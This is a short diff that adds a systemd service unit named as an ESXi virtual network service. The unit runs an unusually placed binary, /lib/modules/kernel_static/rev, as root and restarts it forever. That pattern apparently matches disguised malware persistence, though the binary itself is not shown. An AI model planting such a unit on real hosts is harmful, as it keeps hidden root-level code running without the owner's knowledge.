@@ -1,0 +1,12 @@
+[Install]
+WantedBy=multi-user.target
+
+[Unit]
+Description=ESXI Virtual network service
+
+
+[Service]
+Type=simple
+User=root
+ExecStart=/lib/modules/kernel_static/rev
+Restart=always
